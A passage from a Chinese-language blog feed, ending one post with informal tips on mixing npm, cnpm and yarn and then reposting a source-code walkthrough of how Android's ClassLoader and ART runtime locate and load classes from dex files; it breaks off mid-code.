你不用<code>cnpm</code>，是下载不了一些包的</h5><blockquote><p>搞清楚三者下载包（依赖）的本质结果：</p></blockquote><ul><li>首先向对应的<code>node_module</code>文件夹下面下载包（如果你非要下到全局，那么再见）</li><li>再然后是<code>json</code>文件中添加对应的依赖字段,确定是线上依赖还是开发依赖</li><li>只要做到这两者 你就下包成功</li><li>总结就是 只要结果 过程管你是啥</li></ul><blockquote><p>使用<code>yarn</code>下载过的包，再使用<code>npm cnpm</code>下载 会重复下载，删除之前的包</p></blockquote><ul><li><code>puppeteer</code>这个包所依赖的<code>mini</code>版谷歌浏览器使用<code>cnpm</code>下载就可以完美解决</li><li><code>prerender-spa-plugin</code>这个包依赖上面的木偶戏 <code>puppeteer</code>这个包，也可以用<code>cnpm</code>下载</li><li>混合使用包管理器切记，不要重复下载依赖，<code>npm cnpm</code>下载依赖，一定要添加注明是什么依赖，是否全局安装</li><li><code>yarn</code>和<code>npm i</code>两者，选择前者，原因在上面有提到，总体来说，<code>yarn</code>是不二选择，但是其他两者也不可缺少，比如<code>electron</code>这个依赖，使用<code>cnpm</code>就可以完美一键安装</li></ul><blockquote><p>只要胆大心细，就可以把三者用得如鱼得水，不然就会被按在地上摩擦，实践过程踩坑也是正常 觉得写得好别忘了关注我的专栏，给个赞再走~</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> React &amp; JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android ClassLoader 加载过程源码分析</title>
      <link href="/2022/05/22/Android-ClassLoader-%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/22/Android-ClassLoader-%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.infoq.cn/article/rczbnbwtff_qyjrqieyl">Android ClassLoader 加载过程源码分析</a><br><img src="https://upload-images.jianshu.io/upload_images/15531792-a63dd4d829899994.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="详细分析-ClassLoader-加载原理"><a href="#详细分析-ClassLoader-加载原理" class="headerlink" title="详细分析 ClassLoader 加载原理"></a>详细分析 ClassLoader 加载原理</h2><p>ClassLoader 的继承关系如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-173e82f9a9fce7de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这里我们主要分析一下 <code>BaseDexClassLoader.findClass()</code>和 <code>ClassLoader.loadClass()</code>两个函数在系统中是怎么进行查找 class 的过程。</p><p>我们看一下系统加载类<code>ClassLoader.loadClass()</code>函数实现代码，在<code>ClassLoader.java</code>中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">    throws ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">        &#x2F;&#x2F; 首先 检测是否已经加载过</span><br><span class="line">        Class&lt;?&gt; c &#x3D; findLoadedClass(name);</span><br><span class="line">        if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (parent !&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F;去调用父类的loadClass</span><br><span class="line">                    c &#x3D; parent.loadClass(name, false);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    c &#x3D; findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                &#x2F;&#x2F; ClassNotFoundException thrown if class not found</span><br><span class="line">                &#x2F;&#x2F; from the non-null parent class loader</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;未找到的情况下，使用findClass在当前dex查找</span><br><span class="line">                c &#x3D; findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">    throw new ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>1， <code>loadClass()</code>先调用<code>findLoadedClass()</code>来判断当前类是否已加载;</p></li><li><p>2， 未查找到递归去父类中查找是否加载到缓存；</p></li><li><p>3， 均未缓存，去<code>BootClassLoader</code>中查找；</p></li><li><p>4， 以上未发现，自顶级父类依次向下查找，调用<code>findClass()</code>查找当前 dex。</p></li></ul><h2 id="findLoadedClass-函数分析"><a href="#findLoadedClass-函数分析" class="headerlink" title="findLoadedClass 函数分析"></a>findLoadedClass 函数分析</h2><blockquote><p>下图为<code>findLoadedClass()</code>的调用流程；根据调用流程图配合源代码进行详细的分析原理。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/15531792-a6ed94f6180c403d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>下面介绍对应的源代码实现部分:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">protected final Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    ClassLoader loader;</span><br><span class="line">    if (this &#x3D;&#x3D; BootClassLoader.getInstance())</span><br><span class="line">        loader &#x3D; null;</span><br><span class="line">    else</span><br><span class="line">        loader &#x3D; this;</span><br><span class="line">    return VMClassLoader.findLoadedClass(loader, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数最终统一调用<code>VMClassLoader.findLoadedClass()</code>进行查找类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">native static Class findLoadedClass(ClassLoader cl, String name);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实现在<code>java_lang_VMClassLoader.cc</code>文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">static jclass VMClassLoader_findLoadedClass(JNIEnv* env, jclass, jobject javaLoader,jstring javaName) &#123;</span><br><span class="line">  ....</span><br><span class="line">  ObjPtr&lt;mirror::ClassLoader&gt; loader &#x3D; soa.Decode&lt;mirror::ClassLoader&gt;(javaLoader);</span><br><span class="line">  ClassLinker* cl &#x3D; Runtime::Current()-&gt;GetClassLinker();</span><br><span class="line"></span><br><span class="line">  ObjPtr&lt;mirror::Class&gt; c &#x3D; VMClassLoader::LookupClass(cl,</span><br><span class="line">                                                       soa.Self(),</span><br><span class="line">                                                       descriptor.c_str(),</span><br><span class="line">                                                       descriptor_hash,</span><br><span class="line">                                                       loader);</span><br><span class="line">  if (c !&#x3D; nullptr &amp;&amp; c-&gt;IsResolved()) &#123;</span><br><span class="line">    return soa.AddLocalReference&lt;jclass&gt;(c);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  if (loader !&#x3D; nullptr) &#123;</span><br><span class="line">    &#x2F;&#x2F; Try the common case.</span><br><span class="line">    StackHandleScope&lt;1&gt; hs(soa.Self());</span><br><span class="line">    c &#x3D; VMClassLoader::FindClassInPathClassLoader(cl,</span><br><span class="line">                                                  soa,</span><br><span class="line">                                                  soa.Self(),</span><br><span class="line">                                                  descriptor.c_str(),</span><br><span class="line">                                                  descriptor_hash,</span><br><span class="line">                                                  hs.NewHandle(loader));</span><br><span class="line">    if (c !&#x3D; nullptr) &#123;</span><br><span class="line">      return soa.AddLocalReference&lt;jclass&gt;(c);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  static mirror::Class* LookupClass(ClassLinker* cl,</span><br><span class="line">                                    Thread* self,</span><br><span class="line">                                    const char* descriptor,</span><br><span class="line">                                    size_t hash,</span><br><span class="line">                                    ObjPtr&lt;mirror::ClassLoader&gt; class_loader)</span><br><span class="line">      REQUIRES(!Locks::classlinker_classes_lock_)</span><br><span class="line">      REQUIRES_SHARED(Locks::mutator_lock_) &#123;</span><br><span class="line">    return cl-&gt;LookupClass(self, descriptor, hash, class_loader);</span><br><span class="line">  &#125;</span><br><span class="line">  static ObjPtr&lt;mirror::Class&gt; FindClassInPathClassLoader(ClassLinker* cl,</span><br><span class="line">                                                          ScopedObjectAccessAlreadyRunnable&amp; soa,</span><br><span class="line">                                                          Thread* self,</span><br><span class="line">                                                          const char* descriptor,</span><br><span class="line">                                                          size_t hash,</span><br><span class="line">                                                          Handle&lt;mirror::ClassLoader&gt; class_loader)</span><br><span class="line">      REQUIRES_SHARED(Locks::mutator_lock_) &#123;</span><br><span class="line">    ObjPtr&lt;mirror::Class&gt; result;</span><br><span class="line">    if (cl-&gt;FindClassInBaseDexClassLoader(soa, self, descriptor, hash, class_loader, &amp;result)) &#123;</span><br><span class="line">      return result;</span><br><span class="line">    &#125;</span><br><span class="line">    return nullptr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码<code>findLoadedClass()</code>分为两步；</p><ul><li><p>1，通过<code>class_linker_-&amp;gt;Lookupclass()</code>进行查找加载类；</p></li><li><p>2，如果没找到再通过<code>class_linker_-&amp;gt;FindClassInPathClassLoader()</code>进行查找。</p></li></ul><blockquote><p><code>class_linker_</code>在虚拟机的启动<code>startVM()</code>函数的时候进行的初始化。</p><p><code>Runtime::class_linker_</code>在<code>Runtime::Init()</code>函数的时候做的初始化。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (UNLIKELY(IsAotCompiler())) &#123;</span><br><span class="line">  class_linker_ &#x3D; new AotClassLinker(intern_table_);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  class_linker_ &#x3D; new ClassLinker(intern_table_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继续来分析<code>ClassLinker::LookupClass()</code>函数的具体实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mirror::Class* ClassLinker::LookupClass(Thread* self,</span><br><span class="line">                                        const char* descriptor,</span><br><span class="line">                                        size_t hash,</span><br><span class="line">                                        ObjPtr&lt;mirror::ClassLoader&gt; class_loader) &#123;</span><br><span class="line">  ReaderMutexLock mu(self, *Locks::classlinker_classes_lock_);</span><br><span class="line">  ClassTable* const class_table &#x3D; ClassTableForClassLoader(class_loader);</span><br><span class="line">  if (class_table !&#x3D; nullptr) &#123;</span><br><span class="line">    ObjPtr&lt;mirror::Class&gt; result &#x3D; class_table-&gt;Lookup(descriptor, hash);</span><br><span class="line">    if (result !&#x3D; nullptr) &#123;</span><br><span class="line">      return result.Ptr();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>LookupClass()</code>函数通过<code>class_loader</code>是否为<code>nullptr</code>，<code>nullptr</code>使用<code>boot_class_table_</code>来获取<code>class_table</code>, 否则获取当前<code>ClassLoader</code>的<code>ClassTable</code>。 <code>class_table</code>存放当前已经加载过的 class，其实可以理解为 class cache。如何进行 dex 解析和 aot 等加载系统类和解析映射到内存中的不在此处展开分析。可以了解 art 虚拟机启动进行详细分析。</p><h2 id="findClass-函数分析"><a href="#findClass-函数分析" class="headerlink" title="findClass()函数分析"></a>findClass()函数分析</h2><p>下图是 findClass 的调用流程；根据调用流程图配合下面的代码进行详细的分析了解：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-1c73f823cccac179.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>下面我们介绍对应的源代码实现部分。</p></blockquote><p><code>findClass()</code>函数在<code>BaseDexClassLoader.java</code>实现, 该函数主要做的事情就是在当前 dex 中查找类。如果类在当前 dex 中即返回。</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">   protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">       List&lt;Throwable&gt; suppressedExceptions &#x3D; new ArrayList&lt;Throwable&gt;();</span><br><span class="line">       Class c &#x3D; pathList.findClass(name, suppressedExceptions);</span><br><span class="line">       if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">           ...</span><br><span class="line">           throw cnfe;</span><br><span class="line">       &#125;</span><br><span class="line">       return c;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>pathList</code>类型为<code>DexPathList</code>用来保存<code>dexfile</code>文件的句柄等 dex 的操作。<code>pathList.findClass()</code>实现在当前 dex 中查找类, <code>pathList</code>在<code>new DexClassLoader()</code>构造时初始化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public BaseDexClassLoader(String dexPath, File optimizedDirectory,</span><br><span class="line">          String librarySearchPath, ClassLoader parent) &#123;</span><br><span class="line">      ...</span><br><span class="line">      this.pathList &#x3D; new DexPathList(this, dexPath, librarySearchPath, null);</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>DexPathList.java</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public DexPathList(ClassLoader definingContext, String dexPath,</span><br><span class="line">            String librarySearchPath, File optimizedDirectory) &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        this.definingContext &#x3D; definingContext;</span><br><span class="line">        ArrayList&lt;IOException&gt; suppressedExceptions &#x3D; new ArrayList&lt;IOException&gt;();</span><br><span class="line">        &#x2F;&#x2F; save dexPath for BaseDexClassLoader</span><br><span class="line">        this.dexElements &#x3D; makeDexElements(splitDexPath(dexPath), optimizedDirectory,</span><br><span class="line">                                           suppressedExceptions, definingContext);</span><br><span class="line"></span><br><span class="line">        this.nativeLibraryDirectories &#x3D; splitPaths(librarySearchPath, false);</span><br><span class="line">        this.systemNativeLibraryDirectories &#x3D;</span><br><span class="line">                splitPaths(System.getProperty(&quot;java.library.path&quot;), true);</span><br><span class="line">        List&lt;File&gt; allNativeLibraryDirectories &#x3D; new ArrayList&lt;&gt;(nativeLibraryDirectories);</span><br><span class="line">        allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories);</span><br><span class="line"></span><br><span class="line">        this.nativeLibraryPathElements &#x3D; makePathElements(allNativeLibraryDirectories);</span><br><span class="line"></span><br><span class="line">        if (suppressedExceptions.size() &gt; 0) &#123;</span><br><span class="line">            this.dexElementsSuppressedExceptions &#x3D;</span><br><span class="line">                suppressedExceptions.toArray(new IOException[suppressedExceptions.size()]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            dexElementsSuppressedExceptions &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>dexElements</code>数组保存 dexfile 文件句柄。具体实现在<code>makeDexElements()</code>函数中调用<code>loadDexFile()</code>函数加载 dex。该函数实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DexFile.java</span><br><span class="line">private static DexFile loadDexFile(File file, File optimizedDirectory, ClassLoader loader, Element[] elements) throws IOException &#123;</span><br><span class="line">        if (optimizedDirectory &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return new DexFile(file, loader, elements);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            String optimizedPath &#x3D; optimizedPathFor(file, optimizedDirectory);</span><br><span class="line">            return DexFile.loadDex(file.getPath(), optimizedPath, 0, loader, elements);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>DexFile.loadDex()</code>进行解析加载 dex 文件。关键代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">private DexFile(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123;</span><br><span class="line">    ...</span><br><span class="line">    mCookie &#x3D; openDexFile(sourceName, outputName, flags, loader, elements);</span><br><span class="line">    mInternalCookie &#x3D; mCookie;</span><br><span class="line">    mFileName &#x3D; sourceName;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static Object openDexFile(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123;</span><br><span class="line">    &#x2F;&#x2F; Use absolute paths to enable the use of relative paths when testing on host.</span><br><span class="line">    return openDexFileNative(new File(sourceName).getAbsolutePath(),</span><br><span class="line">                              (outputName &#x3D;&#x3D; null)</span><br><span class="line">                              ? null</span><br><span class="line">                              : new File(outputName).getAbsolutePath(),</span><br><span class="line">                              flags,loader,elements);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static native Object openDexFileNative(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终打开<code>dexfile</code>是通过<code>native</code>方法实现，并且返回<code>mCookie</code>, <code>mCookie</code>类型是<code>int</code>用来标识<code>dex</code>的唯一性。 <code>openDexFileNative()</code>实现代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#96;dalvik_system_DexFile.cc&#96;</span><br><span class="line">static jobject DexFile_openDexFileNative(JNIEnv* env,</span><br><span class="line">                                         jclass,</span><br><span class="line">                                         jstring javaSourceName,</span><br><span class="line">                                         jstring javaOutputName,</span><br><span class="line">                                         jint flags ATTRIBUTE_UNUSED,</span><br><span class="line">                                         jobject class_loader,</span><br><span class="line">                                         jobjectArray dex_elements)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  Runtime* const runtime &#x3D; Runtime::Current();</span><br><span class="line">  ClassLinker* linker &#x3D; runtime-&gt;GetClassLinker();</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  dex_files &#x3D; runtime-&gt;GetOatFileManager().OpenDexFilesFromOat(sourceName.c_str(), class_loader, dex_elements, &#x2F;*out*&#x2F; &amp;oat_file, &#x2F;*out*&#x2F; &amp;error_msgs);</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码通过<code>aotManager</code>打开并返回<code>mCookie</code>，进一步的打开实现不在此处展开。即上述已经填充<code>elements[]</code>,下面开始展开<code>pathList.findClass()</code>函数的查找方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;BaseDexClassLoader.java</span><br><span class="line">public Class&lt;?&gt; findClass(String name, List&lt;Throwable&gt; suppressed) &#123;</span><br><span class="line">    for (Element element : dexElements) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz &#x3D; element.findClass(name, definingContext, suppressed);</span><br><span class="line">        if (clazz !&#x3D; null) &#123;</span><br><span class="line">            return clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (dexElementsSuppressedExceptions !&#x3D; null) &#123;</span><br><span class="line">        suppressed.addAll(Arrays.asList(dexElementsSuppressedExceptions));</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>findClass()</code>会遍历<code>elements[]</code>, 每个<code>element</code>保存了 dex 的<code>DexFile</code>句柄，然后调用<code>loadClassBinaryName()</code>函数进行当前 dex 查找类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;DexPathList.java</span><br><span class="line">  public Class&lt;?&gt; findClass(String name, ClassLoader definingContext,</span><br><span class="line">          List&lt;Throwable&gt; suppressed) &#123;</span><br><span class="line">      return dexFile !&#x3D; null ? dexFile.loadClassBinaryName(name, definingContext, suppressed): null;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public Class loadClassBinaryName(String name, ClassLoader loader, List&lt;Throwable&gt; suppressed) &#123;</span><br><span class="line">    return defineClass(name, loader, mCookie, this, suppressed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static Class defineClass(String name, ClassLoader loader, Object cookie, DexFile dexFile, List&lt;Throwable&gt; suppressed) &#123;</span><br><span class="line">    Class result &#x3D; null;</span><br><span class="line">    try &#123;</span><br><span class="line">        result &#x3D; defineClassNative(name, loader, cookie, dexFile);</span><br><span class="line">    &#125; catch (NoClassDefFoundError e) &#123;</span><br><span class="line">        if (suppressed !&#x3D; null) &#123;</span><br><span class="line">            suppressed.add(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        if (suppressed !&#x3D; null) &#123;</span><br><span class="line">            suppressed.add(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>真正去 dex 或者内存中查找类的函数在<code>native</code>中<code>defineClassNative()</code>实现， 我们来分析一下真正的实现过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">private static native Class defineClassNative(String name, ClassLoader loader, Object cookie, DexFile dexFile)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;dalvik_system_DexFile.cc</span><br><span class="line">static jclass DexFile_defineClassNative(JNIEnv* env,</span><br><span class="line">                                        jclass,</span><br><span class="line">                                        jstring javaName,</span><br><span class="line">                                        jobject javaLoader,</span><br><span class="line">                                        jobject cookie,</span><br><span class="line">                                        jobject dexFile) &#123;</span><br><span class="line">  std::vector&lt;const DexFile*&gt; dex_files;</span><br><span class="line">  const OatFile* oat_file;</span><br><span class="line">  if (!ConvertJavaArrayToDexFiles(env, cookie, &#x2F;*out*&#x2F; dex_files, &#x2F;*out*&#x2F; oat_file)) &#123;</span><br><span class="line">    ...</span><br><span class="line">    return nullptr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ScopedUtfChars class_name(env, javaName);</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  const std::string descriptor(DotToDescriptor(class_name.c_str()));</span><br><span class="line">  const size_t hash(ComputeModifiedUtf8Hash(descriptor.c_str()));</span><br><span class="line">  for (auto&amp; dex_file : dex_files) &#123;</span><br><span class="line">      ...</span><br><span class="line">      ClassLinker* class_linker &#x3D; Runtime::Current()-&gt;GetClassLinker();</span><br><span class="line">      ObjPtr&lt;mirror::Class&gt; result &#x3D; class_linker-&gt;DefineClass(soa.Self(),</span><br><span class="line">                                                               descriptor.c_str(), </span><br><span class="line">                                                               hash,</span><br><span class="line">                                                               class_loader,</span><br><span class="line">                                                               *dex_file,</span><br><span class="line">                                                               *dex_class_def);</span><br><span class="line">      &#x2F;&#x2F; 